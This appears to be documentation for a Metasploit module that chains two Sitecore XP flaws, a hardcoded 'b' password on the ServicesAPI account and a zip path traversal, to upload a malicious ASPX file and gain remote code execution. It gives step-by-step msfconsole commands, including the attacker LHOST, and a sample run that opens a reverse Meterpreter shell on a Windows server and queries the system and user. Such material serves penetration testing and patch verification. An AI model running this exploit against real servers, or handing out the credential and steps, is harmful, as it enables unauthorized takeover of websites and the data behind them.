## Vulnerable Application

The Sitecore Experience Platform (XP) is a flagship CMS product.
Provides comprehensive digital marketing tools, view of customer data and many other features.
Sitecore deploys multiple default service accounts when installing, among them is an account called ServicesAPI.
The versions from 10 to 10.4 have a hardcoded password for this account - the password is the letter b (CVE-2025-34509).
This account is used to gain access and exploit an additional vulnerability - a path traversal in zip extraction (CVE-2025-34510).
This module exploits both vulnerabilities to gain remote code execution by uploading malicious ASPX into the root directory of the webserver.

### Installation

The Sitecore XP can be downloaded from [here](https://developers.sitecore.com/downloads/Sitecore_Experience_Platform).
Please note that a license is required for successful installation.


## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use exploit/windows/http/sitecore_xp_cve_2025_34510`
1. Do: `set RHOSTS [Sitecore XP IP address]`
1. Do: `set VHOST [Sitecore XP hostname]`
1. Do: `set IDENTITY_VHOST [hostname of Sitecore XP identity server]`
1. Do: `set LHOST [attacker IP]`
1. Do: `run`

## Options


### VHOST

The hostname of Sitecore XP.
When installed, Sitecore XP deploys multiple vhosts, among them is the Sitecore XP host, where a user can access majority of functions.


### IDENTITY_VHOST

The Sitecore XP uses separate vhost for "identity host", which is used when user is authenticating and asking for session data.
If you are not sure about `IDENTITY_VHOST`, you can visit `https://[sitecore instance]/identity/login/shell/SitecoreIdentityServer`.
The hostname of page where the URL will redirect you can be used as `IDENTITY_VHOST`.

## Scenarios

```
msf exploit(windows/http/sitecore_xp_cve_2025_34510) > set IDENTITY_VHOST sitecorepocidentityserver.dev.local
msf exploit(windows/http/sitecore_xp_cve_2025_34510) > run verbose=true
[*] Started reverse TCP handler on 192.168.3.7:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Sitecore version detected 10.3.0, which is vulnerable
[*] Sending stage (203846 bytes) to 10.5.132.138
[*] Meterpreter session 2 opened (192.168.3.7:4444 -> 10.5.132.138:50530) at 2025-08-26 13:05:53 +0200

meterpreter > sysinfo
Computer        : WIN11_22H2_0800
OS              : Windows 11 22H2 (10.0 Build 22621).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: IIS APPPOOL\sitecorepocsc.dev.local
```
